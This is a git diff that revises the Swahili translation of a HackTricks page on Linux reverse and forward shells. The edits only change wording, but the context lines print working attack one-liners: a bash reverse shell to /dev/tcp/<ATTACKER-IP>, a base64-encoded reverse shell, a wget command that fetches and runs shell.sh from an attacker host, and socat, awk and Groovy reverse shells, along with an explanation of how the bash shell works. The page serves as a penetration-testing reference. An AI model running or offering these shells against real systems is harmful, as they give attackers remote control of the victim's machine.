@@ -36,7 +36,7 @@ exec >&0
 ```
 Usisahau kuangalia na shell nyingine: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, na bash.
 
-### Symbol salama shell
+### Shell salama ya alama
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -48,9 +48,9 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 #### Maelezo ya Shell
 
 1. **`bash -i`**: Sehemu hii ya amri inaanzisha shell ya Bash ya kuingiliana (`-i`).
-2. **`>&`**: Sehemu hii ya amri ni alama ya kifupi ya **kupeleka pato la kawaida** (`stdout`) na **kosa la kawaida** (`stderr`) kwa **mahali pamoja**.
+2. **`>&`**: Sehemu hii ya amri ni alama ya kifupi kwa **kupeleka pato la kawaida** (`stdout`) na **kosa la kawaida** (`stderr`) kwa **mahali pamoja**.
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Hii ni faili maalum ambayo **inaonyesha muunganisho wa TCP kwa anwani ya IP na bandari iliyoainishwa**.
-* Kwa **kupeleka pato na mstreams ya makosa kwa faili hii**, amri hiyo kwa ufanisi inatuma pato la kikao cha shell ya kuingiliana kwa mashine ya mshambuliaji.
+* Kwa **kupeleka pato na mstreams ya kosa kwa faili hii**, amri hiyo kwa ufanisi inatuma pato la kikao cha shell ya kuingiliana kwa mashine ya mshambuliaji.
 4. **`0>&1`**: Sehemu hii ya amri **inaelekeza ingizo la kawaida (`stdin`) kwa mahali sawa na pato la kawaida (`stdout`)**.
 
 ### Unda katika faili na utekeleze
@@ -60,7 +60,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Wakati unashughulikia **Remote Code Execution (RCE)** udhaifu ndani ya programu ya wavuti inayotumia Linux, kupata reverse shell kunaweza kuzuia na ulinzi wa mtandao kama sheria za iptables au mifumo ya kuchuja pakiti ngumu. Katika mazingira kama haya, njia mbadala ni kuanzisha PTY (Pseudo Terminal) shell ili kuingiliana na mfumo ulioathirika kwa ufanisi zaidi.
+Wakati wa kushughulikia **Remote Code Execution (RCE)** udhaifu ndani ya programu ya wavuti inayotumia Linux, kupata reverse shell kunaweza kuzuia na ulinzi wa mtandao kama sheria za iptables au mifumo ya kuchuja pakiti ngumu. Katika mazingira kama haya, njia mbadala inahusisha kuanzisha PTY (Pseudo Terminal) shell ili kuingiliana na mfumo ulioathirika kwa ufanisi zaidi.
 
 Zana inayopendekezwa kwa ajili ya hili ni [toboggan](https://github.com/n3rada/toboggan.git), ambayo inarahisisha mwingiliano na mazingira ya lengo.
 
@@ -102,7 +102,7 @@ Unahitaji tu kubadilisha:
 * Kichwa na kiambatisho cha payload yako (ikiwa ipo)
 * Njia ambayo payload inatumwa (headers? data? taarifa za ziada?)
 
-Kisha, unaweza tu **kutuma amri** au hata **kutumia amri ya `upgrade`** kupata PTY kamili (kumbuka kwamba mabomba yanapozungumziwa na kuandikwa kwa kuchelewesha takriban 1.3s).
+Kisha, unaweza tu **kutuma amri** au hata **kutumia amri ya `upgrade`** kupata PTY kamili (zingatia kwamba mabomba yanapozungumziwa na kuandikwa kwa kuchelewesha takriban 1.3s).
 
 ## Netcat
 ```bash
@@ -266,7 +266,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
-## Kidole
+## Finger
 
 **Mshambuliaji**
 ```bash
@@ -318,7 +318,7 @@ Xnest :1
 ```
 ## Groovy
 
-by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) KUMBUKA: Java reverse shell pia inafanya kazi kwa Groovy
+na [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) KUMBUKA: Java reverse shell pia inafanya kazi kwa Groovy
 ```bash
 String host="localhost";
 int port=8044;
@@ -341,8 +341,8 @@ Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" al
 <summary>Support HackTricks</summary>
 
 * Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 {% endhint %}
